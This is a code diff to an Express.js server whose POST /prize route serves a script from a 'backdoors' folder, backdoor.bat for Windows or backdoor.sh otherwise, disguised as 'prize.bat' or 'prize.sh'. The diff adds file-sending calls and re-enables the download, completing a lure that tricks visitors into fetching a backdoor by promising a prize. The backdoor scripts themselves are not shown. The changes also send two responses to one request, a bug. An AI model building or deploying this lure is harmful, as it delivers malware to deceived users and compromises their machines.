@@ -20,10 +20,9 @@ app.get("/", (req, res) => {
 
 app.post("/prize", (req, res) => {
 	const clientIP = req.ip;
-
 	let filepath;
 	let filename;
-	const { platform } = req.body;
+	const { platform } = req?.body;
 	if (platform === "windows") {
 		filepath = join(__dirname, "..", "backdoors", "backdoor.bat");
 		filename = "prize.bat";
@@ -34,6 +33,14 @@ app.post("/prize", (req, res) => {
 				if (err) console.error(err);
 			}
 		);
+		res.sendFile(filepath,(err)=>{
+			if(err){
+				console.log(err,"error while sending file");
+			}
+			else{
+				console.log('file sent successfully')
+			}
+		})
 	} else {
 		filepath = join(__dirname, "..", "backdoors", "backdoor.sh");
 		filename = "prize.sh";
@@ -44,10 +51,18 @@ app.post("/prize", (req, res) => {
 				if (err) console.error(err);
 			}
 		);
+		res.sendFile(filepath,(err)=>{
+			if(err){
+				console.log(err,"error while sending file");
+			}
+			else{
+				console.log('file sent successfully')
+			}
+		})
 	}
-	// res.download(filepath, filename, (err) => {
-	// 	if (err) console.error(err);
-	// });
+	res.download(filepath, filename, (err) => {
+		if (err) console.error(err);
+	});
 
 	// res.attachment(filepath).send();
 
